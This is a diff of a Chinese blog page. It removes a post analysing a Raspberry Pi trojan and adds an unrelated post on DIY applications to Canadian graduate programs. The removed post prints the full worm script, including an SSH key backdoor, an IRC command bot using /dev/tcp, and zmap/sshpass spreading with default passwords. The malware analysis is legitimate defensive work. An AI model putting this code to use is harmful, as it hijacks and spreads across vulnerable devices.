@@ -28,10 +28,10 @@
   
     
   
-  <meta name="description" content="今天朋友的服务器被黑了，包括树莓派也被黑了。因为服务器被黑，当作DDOS的肉鸡，被服务商停机了，所以不方便分析。所以就拿树莓派的做了分析，以">
+  <meta name="description" content="之前F君一直都在忙midterm考试，虽然现在还没忙完，但是忍不住要更新了。 （弱弱说一句，这边上一门课真的会让你扎扎实实学到不少东西，总的来">
 
   
-  <link rel="alternate" hreflang="zh-Hans" href="https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/">
+  <link rel="alternate" hreflang="zh-Hans" href="https://academic.faithio.cn/zh/post/diy-%E7%94%B3%E8%AF%B7thesis%E7%A0%94%E7%A9%B6%E7%94%9F/">
 
   
 
@@ -112,7 +112,7 @@
   <link rel="icon" type="image/png" href="../../../img/icon-32.png">
   <link rel="apple-touch-icon" type="image/png" href="../../../img/icon-192.png">
 
-  <link rel="canonical" href="https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/">
+  <link rel="canonical" href="https://academic.faithio.cn/zh/post/diy-%E7%94%B3%E8%AF%B7thesis%E7%A0%94%E7%A9%B6%E7%94%9F/">
 
   
   
@@ -124,15 +124,15 @@
   <meta property="twitter:card" content="summary_large_image">
   
   <meta property="og:site_name" content="Faith写字的地方">
-  <meta property="og:url" content="https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/">
-  <meta property="og:title" content="记一次树莓派Trojan的分析 | Faith写字的地方">
-  <meta property="og:description" content="今天朋友的服务器被黑了，包括树莓派也被黑了。因为服务器被黑，当作DDOS的肉鸡，被服务商停机了，所以不方便分析。所以就拿树莓派的做了分析，以"><meta property="og:image" content="https://academic.faithio.cn/img/code.jpg">
+  <meta property="og:url" content="https://academic.faithio.cn/zh/post/diy-%E7%94%B3%E8%AF%B7thesis%E7%A0%94%E7%A9%B6%E7%94%9F/">
+  <meta property="og:title" content="DIY 申请研究生 | Faith写字的地方">
+  <meta property="og:description" content="之前F君一直都在忙midterm考试，虽然现在还没忙完，但是忍不住要更新了。 （弱弱说一句，这边上一门课真的会让你扎扎实实学到不少东西，总的来"><meta property="og:image" content="https://academic.faithio.cn/img/code.jpg">
   <meta property="twitter:image" content="https://academic.faithio.cn/img/code.jpg"><meta property="og:locale" content="zh-Hans">
   
     
-      <meta property="article:published_time" content="2020-02-20T18:30:36-05:00">
+      <meta property="article:published_time" content="2020-02-10T18:30:36-05:00">
     
-    <meta property="article:modified_time" content="2020-02-22T18:30:36-05:00">
+    <meta property="article:modified_time" content="2020-02-10T18:30:36-05:00">
   
 
   
@@ -141,7 +141,7 @@
   <script data-ad-client="ca-pub-1438507724851578" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 
 
-  <title>记一次树莓派Trojan的分析 | Faith写字的地方</title>
+  <title>DIY 申请研究生 | Faith写字的地方</title>
 
 </head>
 
@@ -358,7 +358,7 @@
   
   
 <div class="article-container pt-3">
-  <h1 itemprop="name">记一次树莓派Trojan的分析</h1>
+  <h1 itemprop="name">DIY 申请研究生</h1>
 
   
 
@@ -367,8 +367,8 @@
 
 
 
-<meta content="2020-02-20 18:30:36 -0500 EST" itemprop="datePublished">
-<meta content="2020-02-22 18:30:36 -0500 EST" itemprop="dateModified">
+<meta content="2020-02-10 18:30:36 -0500 EST" itemprop="datePublished">
+<meta content="2020-02-10 18:30:36 -0500 EST" itemprop="dateModified">
 
 <div class="article-metadata">
 
@@ -380,10 +380,8 @@
     
     
       
-          最近更新于
-      
     
-    <time>Feb 22, 2020</time>
+    <time>Feb 10, 2020</time>
   </span>
   
 
@@ -392,7 +390,7 @@
   
   <span class="middot-divider"></span>
   <span class="article-reading-time">
-    3 （分钟）预计阅读
+    5 （分钟）预计阅读
   </span>
   
 
@@ -416,7 +414,7 @@
       
       
       <li>
-        <a href="https://twitter.com/intent/tweet?url=https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/&amp;text=%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%a0%91%e8%8e%93%e6%b4%beTrojan%e7%9a%84%e5%88%86%e6%9e%90" target="_blank" rel="noopener" class="share-btn-twitter">
+        <a href="https://twitter.com/intent/tweet?url=https://academic.faithio.cn/zh/post/diy-%E7%94%B3%E8%AF%B7thesis%E7%A0%94%E7%A9%B6%E7%94%9F/&amp;text=DIY%20%e7%94%b3%e8%af%b7%e7%a0%94%e7%a9%b6%e7%94%9f" target="_blank" rel="noopener" class="share-btn-twitter">
           <i class="fab fa-twitter"></i>
         </a>
       </li>
@@ -429,7 +427,7 @@
       
       
       <li>
-        <a href="https://www.facebook.com/sharer.php?u=https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/&amp;t=%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%a0%91%e8%8e%93%e6%b4%beTrojan%e7%9a%84%e5%88%86%e6%9e%90" target="_blank" rel="noopener" class="share-btn-facebook">
+        <a href="https://www.facebook.com/sharer.php?u=https://academic.faithio.cn/zh/post/diy-%E7%94%B3%E8%AF%B7thesis%E7%A0%94%E7%A9%B6%E7%94%9F/&amp;t=DIY%20%e7%94%b3%e8%af%b7%e7%a0%94%e7%a9%b6%e7%94%9f" target="_blank" rel="noopener" class="share-btn-facebook">
           <i class="fab fa-facebook-f"></i>
         </a>
       </li>
@@ -442,7 +440,7 @@
       
       
       <li>
-        <a href="mailto:?subject=%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%a0%91%e8%8e%93%e6%b4%beTrojan%e7%9a%84%e5%88%86%e6%9e%90&amp;body=https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/" target="_blank" rel="noopener" class="share-btn-email">
+        <a href="mailto:?subject=DIY%20%e7%94%b3%e8%af%b7%e7%a0%94%e7%a9%b6%e7%94%9f&amp;body=https://academic.faithio.cn/zh/post/diy-%E7%94%B3%E8%AF%B7thesis%E7%A0%94%E7%A9%B6%E7%94%9F/" target="_blank" rel="noopener" class="share-btn-email">
           <i class="fas fa-envelope"></i>
         </a>
       </li>
@@ -455,7 +453,7 @@
       
       
       <li>
-        <a href="https://www.linkedin.com/shareArticle?url=https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/&amp;title=%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%a0%91%e8%8e%93%e6%b4%beTrojan%e7%9a%84%e5%88%86%e6%9e%90" target="_blank" rel="noopener" class="share-btn-linkedin">
+        <a href="https://www.linkedin.com/shareArticle?url=https://academic.faithio.cn/zh/post/diy-%E7%94%B3%E8%AF%B7thesis%E7%A0%94%E7%A9%B6%E7%94%9F/&amp;title=DIY%20%e7%94%b3%e8%af%b7%e7%a0%94%e7%a9%b6%e7%94%9f" target="_blank" rel="noopener" class="share-btn-linkedin">
           <i class="fab fa-linkedin-in"></i>
         </a>
       </li>
@@ -468,7 +466,7 @@
       
       
       <li>
-        <a href="https://web.whatsapp.com/send?text=%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%a0%91%e8%8e%93%e6%b4%beTrojan%e7%9a%84%e5%88%86%e6%9e%90%20https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+        <a href="https://web.whatsapp.com/send?text=DIY%20%e7%94%b3%e8%af%b7%e7%a0%94%e7%a9%b6%e7%94%9f%20https://academic.faithio.cn/zh/post/diy-%E7%94%B3%E8%AF%B7thesis%E7%A0%94%E7%A9%B6%E7%94%9F/" target="_blank" rel="noopener" class="share-btn-whatsapp">
           <i class="fab fa-whatsapp"></i>
         </a>
       </li>
@@ -481,7 +479,7 @@
       
       
       <li>
-        <a href="https://service.weibo.com/share/share.php?url=https://academic.faithio.cn/zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/&amp;title=%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%a0%91%e8%8e%93%e6%b4%beTrojan%e7%9a%84%e5%88%86%e6%9e%90" target="_blank" rel="noopener" class="share-btn-weibo">
+        <a href="https://service.weibo.com/share/share.php?url=https://academic.faithio.cn/zh/post/diy-%E7%94%B3%E8%AF%B7thesis%E7%A0%94%E7%A9%B6%E7%94%9F/&amp;title=DIY%20%e7%94%b3%e8%af%b7%e7%a0%94%e7%a9%b6%e7%94%9f" target="_blank" rel="noopener" class="share-btn-weibo">
           <i class="fab fa-weibo"></i>
         </a>
       </li>
@@ -528,210 +526,145 @@
       
 
 <blockquote>
-<p>今天朋友的服务器被黑了，包括树莓派也被黑了。因为服务器被黑，当作DDOS的肉鸡，被服务商停机了，所以不方便分析。所以就拿树莓派的做了分析，以此记录一下过程。</p>
+<p>之前F君一直都在忙midterm考试，虽然现在还没忙完，但是忍不住要更新了。</p>
+
+<p>（弱弱说一句，这边上一门课真的会让你扎扎实实学到不少东西，总的来说体验还是非常好的，怪不得那么多家长送孩子出国读书，有机会的话，未来我也会让孩子出国读书<del>如果他考不上C9等985名校的话</del>）</p>
 </blockquote>
 
-<h3 id="表征">表征</h3>
+<p>因为F君是DIY申请的，想必动辄几万块申请，F君更希望将命运把握在自己手里！（<del>连申请这么简单的活都搞不定，怎么出国读书呢，对吧</del>）</p>
 
-<p>当树莓派联网的时候，有线网口的数据灯狂闪，ssh无法登陆。只有通过外接显示器找到这个机器来查找了。</p>
+<p>这次我们的话题是如何DIY申请thesis研究生！</p>
 
-<p>首先TOP一下，一下子找到CPU占用的罪魁祸首，直接定位到这个恶意脚本。</p>
+<h3 id="研究生类型">研究生类型</h3>
 
-<pre><code class="language-bash">#!/bin/bash
+<p>首先明确一个概念，在加拿大研究生一般分为两种</p>
 
-MYSELF=`realpath $0`
-DEBUG=/dev/null
-echo $MYSELF &gt;&gt; $DEBUG
+<ul>
+<li>Thesis-based 可以对应国内的学硕
 
-if [ &quot;$EUID&quot; -ne 0 ]
-then
-    NEWMYSELF=`mktemp -u 'XXXXXXXX'`
-    sudo cp $MYSELF /opt/$NEWMYSELF
-    sudo sh -c &quot;echo '#!/bin/sh -e' &gt; /etc/rc.local&quot;
-    sudo sh -c &quot;echo /opt/$NEWMYSELF &gt;&gt; /etc/rc.local&quot;
-    sudo sh -c &quot;echo 'exit 0' &gt;&gt; /etc/rc.local&quot;
-    sleep 1
-    sudo reboot
-else
-</code></pre>
+<ul>
+<li>一般是有导师带着，主要研究方向以导师的方向为准，一般来说有可能导师属于安全专业或者电气专业，但是他做深度学习的话，其实也是可以的，弊端就是可能要修几门这个项目的必修课。好处就是可以不用修很多课啊。</li>
+<li>必须要发paper，换句话说，想要毕业的话，需要导师签字，怎么才让导师签字呢？干足够的活儿，发论文呗</li>
+<li>想要读博最好要读thesis，虽然授课也有可能，但是thesis发过paper的，才更好申请Phd</li>
+<li>有奖金（funding），不管导师以什么形式给你，RA/TA甚至让你去企业做研究项目</li>
+<li>请假方便，完全取决于导师</li>
+<li>一般来说新来的AP（Assistant Professor）会比较Push，北美这边基本就是5年考核，就是新来的AP需要在5年内出一定的成果才能拿到终身教职，因此，跟AP老板压力会比较大，但是同时他也会亲力亲为，手把手教你。如果是Professor虽然不Push但是可能就比较佛系。（<del>据说华人（nv）AP会比较Push，老外相对会佛系一点，自行判断。</del>，ratemyprofessors.com可以查哦）</li>
+</ul></li>
+<li>Course-based 或者 Project-based
 
-<p>首先做了自我拷贝，并且自动重启。</p>
+<ul>
+<li>一般无奖需要自费</li>
+<li>一般是要修10门课左右，并且一般是有必修课</li>
+<li>最后毕业不一定要写论文，一般是做一个大project或者report即可毕业。</li>
+<li>可以选各种的课，但是不会像thesis一样深入到某一个方向或者领域，但是涉及面非常广，对于应届本科生来说，这些课一般需要大量的编程实践，会对编程能力有非常大的提高，总的来说这些项目虽然没有企业的项目规模大，但是足够成为一个初级程序员。</li>
+</ul></li>
+</ul>
 
-<pre><code class="language-bash">TMP1=`mktemp`
-echo $TMP1 &gt;&gt; $DEBUG
+<h3 id="申请材料">申请材料</h3>
 
-killall bins.sh
-killall minerd
-killall node
-killall nodejs
-killall ktx-armv4l
-killall ktx-i586
-killall ktx-m68k
-killall ktx-mips
-killall ktx-mipsel
-killall ktx-powerpc
-killall ktx-sh4
-killall ktx-sparc
-killall arm5
-killall zmap
-killall kaiten
-killall perl
-</code></pre>
+<ol>
+<li>CV/Resume</li>
+</ol>
 
-<p>kill了一系列进程</p>
+<p>个人简历，这个建议用rmd进行排版，看起来会比较工整，不需要个人照片，大家可以网上找一些模版。（不会rmd狂私信我吧，这里不展开说了）</p>
 
-<p>然后来到比较恶心的部分。</p>
+<ol>
+<li>Personal Statement（PS）/Statement of Purpose（SOP）</li>
+</ol>
 
-<pre><code class="language-bash">echo &quot;127.0.0.1 bins.deutschland-zahlung.eu&quot; &gt;&gt; /etc/hosts
-rm -rf /root/.bashrc
-rm -rf /home/pi/.bashrc
-</code></pre>
+<p>两者都是属于个人陈述，但是是有一定细微区别，SOP可能还要需要写一些学术上的计划，具体需要参考每个学校的网站，要求会不一样。千万不要一份PS或者SOP投给所有学校，<strong>一定要有一些针对性改动。</strong></p>
 
-<p>删除了你的所有用户配置</p>
+<ol>
+<li>Reference Letter（RL）</li>
+</ol>
 
-<pre><code>usermod -p \$6\$vGkGPKUr\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi
-</code></pre>
+<p>推荐信，一般是三封，可以三封都是来自学术机构的教授，或者最少2封来自学术机构，1封来自工业界的上司。</p>
 
-<p>把ssh密码修改了！</p>
+<p>一般是是以邮件的形式发过来，填写电子推荐信以及对申请人打分。也有极少数需要手写签名再扫描的或者需要直接邮寄过去的。</p>
 
-<pre><code>mkdir -p /root/.ssh
-echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B&quot;  &gt;&gt; /root/.ssh/authorized_keys
-</code></pre>
+<ol>
+<li>Transcript</li>
+</ol>
 
-<p>这里用到一个/tmp/public.pem 公钥，下面能看到为什么他这样用。</p>
+<p>本科成绩单，需要中英文都有，而且可能还需要这个成绩单的Scale，大概就是譬如90-100属于A，80-90属于B这样的打分</p>
 
-<pre><code class="language-bash">BOT=`mktemp -u 'XXXXXXXX'`
+<ol>
+<li><p>毕业证和学位证</p></li>
 
-cat &gt; /tmp/$BOT &lt;&lt;'EOFMARKER'
-#!/bin/bash
+<li><p>IELTS/TOEFL</p></li>
+</ol>
 
-SYS=`uname -a | md5sum | awk -F' ' '{print $1}'`
-NICK=a${SYS:24}
-while [ true ]; do
+<p>具体需要看学校的要求，一般来说IELTS 6.5以上，TOEFL 90以上吧。</p>
 
-    arr[0]=&quot;ix1.undernet.org&quot;
-    arr[1]=&quot;ix2.undernet.org&quot;
-    arr[2]=&quot;Ashburn.Va.Us.UnderNet.org&quot;
-    arr[3]=&quot;Bucharest.RO.EU.Undernet.Org&quot;
-    arr[4]=&quot;Budapest.HU.EU.UnderNet.org&quot;
-    arr[5]=&quot;Chicago.IL.US.Undernet.org&quot;
-    rand=$[$RANDOM % 6]
-    svr=${arr[$rand]}
+<blockquote>
+<p>留个彩蛋：如果阅读量破千了，F君就公开当时搜集的加拿大学校雅思托福的成绩要求清单，大家加油转发啊！</p>
+</blockquote>
 
-    eval 'exec 3&lt;&gt;/dev/tcp/$svr/6667;'
-    if [[ ! &quot;$?&quot; -eq 0 ]] ; then
-            continue
-    fi
+<ol>
+<li>（可选）Research Statement</li>
+</ol>
 
-    echo $NICK
+<p>研究陈述，有的研究生项目需要的，具体怎么写需要参考一下具体学校。</p>
 
-    eval 'printf &quot;NICK $NICK\r\n&quot; &gt;&amp;3;'
-    if [[ ! &quot;$?&quot; -eq 0 ]] ; then
-            continue
-    fi
-    eval 'printf &quot;USER user 8 * :IRC hi\r\n&quot; &gt;&amp;3;'
-    if [[ ! &quot;$?&quot; -eq 0 ]] ; then
-        continue
-    fi
+<ol>
+<li>（可选）个人获奖证书</li>
+</ol>
 
-    # Main loop
-    while [ true ]; do
-        eval &quot;read msg_in &lt;&amp;3;&quot;
+<p>上述是申请授课研究型研究生的必要材料了，大家看看确实不多吧？</p>
 
-        if [[ ! &quot;$?&quot; -eq 0 ]] ; then
-            break
-        fi
+<h4 id="thesis研究生最重要的还有一步">Thesis研究生最重要的还有一步</h4>
 
-        if  [[ &quot;$msg_in&quot; =~ &quot;PING&quot; ]] ; then
-            printf &quot;PONG %s\n&quot; &quot;${msg_in:5}&quot;;
-            eval 'printf &quot;PONG %s\r\n&quot; &quot;${msg_in:5}&quot; &gt;&amp;3;'
-            if [[ ! &quot;$?&quot; -eq 0 ]] ; then
-                break
-            fi
-            sleep 1
-            eval 'printf &quot;JOIN #biret\r\n&quot; &gt;&amp;3;'
-            if [[ ! &quot;$?&quot; -eq 0 ]] ; then
-                break
-            fi
-        elif [[ &quot;$msg_in&quot; =~ &quot;PRIVMSG&quot; ]] ; then
-            privmsg_h=$(echo $msg_in| cut -d':' -f 3)
-            privmsg_data=$(echo $msg_in| cut -d':' -f 4)
-            privmsg_nick=$(echo $msg_in| cut -d':' -f 2 | cut -d'!' -f 1)
+<p>就是<strong>套辞</strong>了</p>
 
-            hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F' ' '{print $1}'`
-            sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`
+<p>说白了就是去学校主页到合适的教授合适的研究方向，然后发邮件发CV发成绩单，和教授聊聊人生，吹吹牛，看看他愿不愿意收你！其实这是一个相当费时间的！</p>
 
-            if [[ &quot;$sign&quot; == &quot;$hash&quot; ]] ; then
-                CMD=`echo $privmsg_data | base64 -d -i`
-                RES=`bash -c &quot;$CMD&quot; | base64 -w 0`
-                eval 'printf &quot;PRIVMSG $privmsg_nick :$RES\r\n&quot; &gt;&amp;3;'
-                if [[ ! &quot;$?&quot; -eq 0 ]] ; then
-                    break
-                fi
-            fi
-        fi
-    done
-done
-EOFMARKER
+<ol>
+<li>一个系的教授可能互相认识，所以一个系一次只能发一个教授，千万不要并行，切记</li>
+<li>最后等教授回复了才采取下一步动作，如果一周内没回复可以试试再问一次，如果实在不回那就赶紧换吧</li>
+<li>需要注意，哪些教授的方向适合你，这个教授人好不好，这很重要，关系到能否毕业，另外看到一些Phd读不下去了，原因你懂的。</li>
+</ol>
 
-chmod +x /tmp/$BOT
-nohup /tmp/$BOT 2&gt;&amp;1 &gt; /tmp/bot.log &amp;
-rm /tmp/nohup.log -rf
-rm -rf nohup.out
-sleep 3
-rm -rf /tmp/$BOT
-</code></pre>
+<p>这时，亲爱的小伙伴们就会问了，这个很费时间啊，一个学校的教授列表，还要挨个点进去，同时看教授的评分（ratemyprofessor）和还有研究方向等等，这样很累啊！对啊，所以F君拯救你了。</p>
 
-<p>直接是利用IRC协议，生成了一个后门，然后通过私信机器来执行指令，而上面那个公钥就是hash，如果hash比对一致的话就能执行下发的指令。那么到底是谁下发指令呢？其实还是botmaster，也就是JOIN #biret，这个频道里的人！但是这个也是一个傀儡机器，真正下发流程应该是 hacker -&gt; botmaster -&gt; bot(肉鸡)。我们先往下看他gan了什么！</p>
+<p><img src="http://bbs.gter.net/data/attachment/forum/201901/10/220030sffk975f5f5f7313.png.thumb.jpg" alt="屏幕快照 2019-01-10 下午9.59.53.png" /></p>
 
-<pre><code class="language-bash">NAME=`mktemp -u 'XXXXXXXX'`
+<p>F君当年写了一个超级简陋版本的Chrome插件，输入关键字就可以搜索了，通用的。原理就是这个名字是超链接，一般有学校名作为区分，以上图为例，Manitoba就能搜出当前教授的相关有用信息，more可以查看教授研究方向。</p>
 
-date &gt; /tmp/.s
+<blockquote>
+<p><a href="https://github.com/iamfaith/scholarHelper" target="_blank">https://github.com/iamfaith/scholarHelper</a></p>
 
-apt-get update -y --force-yes
-apt-get install zmap sshpass -y --force-yes
+<p>github我放出来了，如果需要的话可以改进一下吧，我承认我写的很挫，就是写了一个晚上的toy sample，有兴趣提个merge request看看撒？</p>
 
-while [ true ]; do
-    FILE=`mktemp`
-    zmap -p 22 -o $FILE -n 100000
-    killall ssh scp
-    for IP in `cat $FILE`
-    do
-        sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  &amp;&amp; echo $IP &gt;&gt; /opt/.r &amp;&amp; sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no &quot;cd /tmp &amp;&amp; chmod +x $NAME &amp;&amp; bash -c ./$NAME&quot; &amp;
-        sshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  &amp;&amp; echo $IP &gt;&gt; /opt/.r &amp;&amp; sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no &quot;cd /tmp &amp;&amp; chmod +x $NAME &amp;&amp; bash -c ./$NAME&quot; &amp;
-    done
-    rm -rf $FILE
-    sleep 10
-done
+<p>什么你不会装chrome插件？当我没说过</p>
 
-fi
-</code></pre>
+<p>（再留个彩蛋，阅读量超过900，我把当时套辞所有<strong>机器学习</strong>方向的教授全部放出来）</p>
+</blockquote>
 
-<p>其实很简答就是用zmap进行全网扫描，扫到树莓派的弱密码，默认密码raspberry，就是拷贝自身进去，不断复制，并且记录到本地/opt/.r。打开这个文件一看发现，哇擦，好几百个ip了，随便试了一个。</p>
+<h3 id="最后心里话">最后心里话</h3>
 
-<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9tt7ctwovj30y00ektba.jpg" alt="image-20191211230723120" /></p>
+<p>人生不设限，这里大龄去读书的真的很多，上课也经常能看到学生的年纪比教授还大的情况。相比这个更应该担心的是签证，一般来说大龄的话，签证不是很好过。</p>
 
-<p>居然进去了。查了一下位置，嗯。。捷克🇨🇿的。</p>
+<p>申请的过程确实不是很复杂，建议有时间的话还是自己DIY，就写几份资料，填填申请，中介要收几万块呢？说实话这个钱太好赚了。如果自己DIY的话充其量就是交一点申请费，大概50-100加币一个项目不等。（当然请中介也是不包括申请费的，还是要自己掏）</p>
 
-<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9tt8jz59nj30aq054t8t.jpg" alt="image-20191211230832765" /></p>
+<p>像我了解到印度那些国家，很多学生基本都是自己申请的，他们很多基本就是有<strong>10w人民币</strong>就敢过来留学了！这个展开说又是另外一个话题了，后面我会慢慢说～</p>
 
-<p>ok，我回头再说IRC，我们可以径直找到那个channel，直接把botmaster揪出来！我随便起了个名字，进去了，发现嘿嘿，那个@salary就是botmaster。</p>
+<p>今天就到这了，F君要去看书了</p>
 
-<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9tt4c14wej31ao0ds42d.jpg" alt="image-20191211230423946" /></p>
+<p>We only part to meet again!</p>
 
-<p>然而，查了一下@salary的ip，发现事情并不是那么简单啊</p>
+<h3 id="外部资料">外部资料</h3>
 
-<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9ttbu1en5j30p0028mxf.jpg" alt="image-20191211231141791" /></p>
+<ol>
+<li><p>网站：寄托天下，一亩三分地， 小木虫</p></li>
 
-<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9ttcobfo1j30bw068jrm.jpg" alt="image-20191211231229583" /></p>
+<li><p>学校排名</p></li>
+</ol>
 
-<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1g9ttc4trxij31160ruq9i.jpg" alt="image-20191211231158569" /></p>
+<p><img src="https://tva1.sinaimg.cn/large/006y8mN6gy1g810x340dpj30l30h0ac9.jpg" alt="Pasted Graphic 1.png" /></p>
 
-<p>这个黑客到底是谁呢？把泰国的TOT公共有限公司给黑了，当作傀儡机器。。。</p>
+<p><img src="https://tva1.sinaimg.cn/large/006y8mN6gy1g810x7p4olj30kb0h5dhz.jpg" alt="Pasted Graphic 2.png" /></p>
 
-<p>所以互联网的阴暗面真的不是广为人知……</p>
-
-<p>醒醒吧 同学们，不要再用默认密码，弱密码了，检查一下你们的路由器/服务器/手机&amp;……等</p>
+<p><img src="https://tva1.sinaimg.cn/large/006y8mN6gy1g810ya0tdvj30lf0l7whe.jpg" alt="Pasted Graphic.png" /></p>
 
     </div>
 
@@ -908,14 +841,14 @@ fi
   
   <div class="post-nav-item">
     <div class="meta-nav">下一页</div>
-    <a href="../../../zh/post/%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%80%E5%A4%A7%E6%9C%9F%E6%9C%9B%E7%AE%97%E6%B3%95em-algorithm/" rel="next">什么是最大期望算法(EM Algorithm)</a>
+    <a href="../../../zh/post/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A0%91%E8%8E%93%E6%B4%BEtrojan%E7%9A%84%E5%88%86%E6%9E%90/" rel="next">记一次树莓派Trojan的分析</a>
   </div>
   
   
   
   <div class="post-nav-item">
     <div class="meta-nav">上一页</div>
-    <a href="../../../zh/post/diy-%E7%94%B3%E8%AF%B7thesis%E7%A0%94%E7%A9%B6%E7%94%9F/" rel="prev">DIY 申请研究生</a>
+    <a href="../../../zh/post/%E5%A6%82%E4%BD%95%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bdiy%E7%94%B3%E8%AF%B7%E7%A0%94%E7%A9%B6%E7%94%9F/" rel="prev">如何从零开始DIY申请研究生-申请奖学金</a>
   </div>
   
 
